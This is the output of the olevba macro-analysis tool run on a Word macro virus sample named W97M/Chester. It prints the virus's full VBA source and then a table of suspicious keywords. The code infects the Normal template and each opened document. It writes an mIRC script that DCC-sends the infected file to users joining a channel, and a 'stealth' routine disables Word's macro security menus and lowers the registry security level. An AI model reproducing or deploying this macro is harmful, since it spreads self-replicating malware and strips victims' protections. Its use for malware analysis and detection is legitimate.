olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chester
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chester - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'W97M/Chester
Private Sub Document_Open()
'W97M/Chester
On Error Resume Next
'W97M/Chester
Set ntc = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
'W97M/Chester
Set adc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
'W97M/Chester
Call stealth
'W97M/Chester
If adc.lines(1, 1) <> "'W97M/Chester" Then
'W97M/Chester
adc.insertlines 1, ntc.lines(1, ntc.countoflines)
'W97M/Chester
End If
'W97M/Chester
If ntc.lines(1, 1) <> "'W97M/Chester" Then
'W97M/Chester
ntc.insertlines 1, adc.lines(1, adc.countoflines)
End If
'W97M/Chester
If Dir("c:\mirc\mirc32.exe") <> "" Then
'W97M/Chester
Script = "c:\mirc\script.ini"
'W97M/Chester
chester = "c:\mirc\download\chester.txt.doc"
'W97M/Chester
ActiveDocument.SaveAs chester
'W97M/Chester
End If
'W97M/Chester
GoTo mirc
'W97M/Chester
If Dir("c:\Progra~1\mirc\mirc32.exe") <> "" Then
'W97M/Chester
Script = "c:\Progra~1\mirc\script.ini"
'W97M/Chester
chester = "c:\Progra~1\mirc\download\chester.txt.doc"
'W97M/Chester
ActiveDocument.SaveAs chester
'W97M/Chester
End If
'W97M/Chester
mirc:
'W97M/Chester
Open Script For Output As #1
'W97M/Chester
Print #1, "[Script]"
'W97M/Chester
Print #1, ""
'W97M/Chester
Print #1, "n0=on 1:Join:#: {"
'W97M/Chester
Print #1, "n1=/if ($nick == $me ) {Halt}"
'W97M/Chester
Print #1, "n2=/DCC Send chester"
'W97M/Chester
Print #1, "n3=/Clear"
'W97M/Chester
Print #1, "n4=/MOTD"
'W97M/Chester
Print #1, "n5=}"
'W97M/Chester
Close #1
'W97M/Chester
End Sub
'W97M/Chester
Sub stealth()
'W97M/Chester
On Error Resume Next
'W97M/Chester
CommandBars("Macro").Controls("Security").Enabled = 0
'W97M/Chester
CommandBars("Tools").Controls("Macro").Enabled = 0
'W97M/Chester
CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = 0
'W97M/Chester
CommandBars("Tools").Controls("Options...").Enabled = 0
'W97M/Chester
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "level") = 1&
'W97M/Chester
End Sub
'W97M/Chester
Sub HelpAbout()
'W97M/Chester
On Error Resume Next
'W97M/Chester
If Day(Now) = 11 Then
'W97M/Chester
MsgBox "Ultimately there is nothing to forgive," & vbCr & "because ther is nothing to judge and " & vbCr & "no one to blame!!", vbSystemModal, "W97M/Chester"
'W97M/Chester
End If
'W97M/Chester
Dialogs(wdDialogHelpAbout).Show
'W97M/Chester
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirc32.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

